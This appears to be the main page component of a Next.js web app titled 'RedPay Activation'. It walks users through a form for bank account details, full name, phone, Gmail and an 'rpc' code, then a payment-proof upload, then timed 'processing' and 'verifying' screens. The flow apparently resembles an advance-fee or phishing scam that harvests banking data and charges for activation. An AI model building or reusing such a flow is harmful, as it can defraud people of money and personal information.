"use client"

import { useState } from "react"
import { WelcomePage } from "@/components/welcome-page"
import { BankDetailsForm } from "@/components/bank-details-form"
import { PaymentPage } from "@/components/payment-page"
import { SuccessPage } from "@/components/success-page"
import { ProcessingPage } from "@/components/processing-page"
import { VerifyingPage } from "@/components/verifying-page"

export interface FormData {
  bank: string
  accountNumber: string
  rpc: string
  fullName: string
  phoneNumber: string
  gmail: string
}

export default function Home() {
  const [step, setStep] = useState(0)
  const [formData, setFormData] = useState<FormData>({
    bank: "",
    accountNumber: "",
    rpc: "",
    fullName: "",
    phoneNumber: "",
    gmail: "",
  })
  const [paymentProof, setPaymentProof] = useState<File | null>(null)

  const handleFormSubmit = (data: FormData) => {
    setFormData(data)
    setStep(2)
  }

  const handlePaymentSubmit = (proof: File) => {
    setPaymentProof(proof)
    setStep(4)
  }

  const handleRetry = () => {
    setPaymentProof(null)
    setStep(3)
  }

  if (step === 0) {
    return <WelcomePage onBegin={() => setStep(1)} />
  }

  if (step === 2) {
    return <ProcessingPage onComplete={() => setStep(3)} />
  }

  if (step === 4) {
    return <VerifyingPage onComplete={() => setStep(5)} />
  }

  return (
    <main className="min-h-screen bg-background">
      <div className="mx-auto max-w-md px-4 py-8">
        {/* Header */}
        <div className="mb-8 text-center">
          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-primary">
            <span className="text-2xl font-bold text-primary-foreground">R</span>
          </div>
          <h1 className="text-2xl font-bold text-foreground">RedPay Activation</h1>
        </div>



        {/* Content */}
        {step === 1 && <BankDetailsForm onSubmit={handleFormSubmit} initialData={formData} />}
        {step === 3 && <PaymentPage onSubmit={handlePaymentSubmit} onBack={() => setStep(1)} />}
        {step === 4 && <VerifyingPage onComplete={() => setStep(5)} onRetry={handleRetry} />}
        {step === 5 && <SuccessPage formData={formData} />}
      </div>
    </main>
  )
}
